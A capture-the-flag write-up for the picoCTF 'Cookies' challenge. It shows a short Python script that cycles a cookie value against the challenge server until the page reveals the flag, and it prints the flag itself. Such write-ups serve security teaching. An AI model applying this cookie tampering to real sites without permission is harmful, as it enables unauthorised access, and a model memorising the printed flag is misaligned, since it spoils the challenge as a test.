# Cookies picoCTF Write-Up

## Challenge Description
This challenge involves analyzing cookies on a website where the cookie named "name" has an initial value of -1. Changing the value of this cookie affects the response displayed on the webpage. The goal is to find the correct cookie value that reveals the flag.

## Solution Steps

1. **Understanding the Challenge**  
   The website uses a cookie named "name" to determine its response. By modifying this cookie's value, we can observe how the website reacts.

2. **Automating the Process with Python**  
   To efficiently test multiple values for the cookie, we write a Python script to iterate through potential values and check the response for the presence of the flag.

   ```python
   import requests
   for i in range(25):
       cookie = 'name={}'.format(i)
       headers = {'Cookie': cookie}
       
       r = requests.get('http://mercury.picoctf.net:27177/check', headers=headers)
       if (r.status_code == 200) and ('picoCTF' in r.text):
           print(r.text)
           print(cookie)
   ```

3. **Executing the Script**  
   Running the script sends HTTP requests to the target website with different cookie values. If a response contains the flag, the script prints it along with the corresponding cookie value.

4. **Finding the Flag**  
   The output of the script reveals that when the cookie "name" is set to 18, the webpage displays the flag:
   
   ```html
   <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
   ```

## Flag
```
picoCTF{3v3ry1_l0v3s_c00k135_064663be}
```
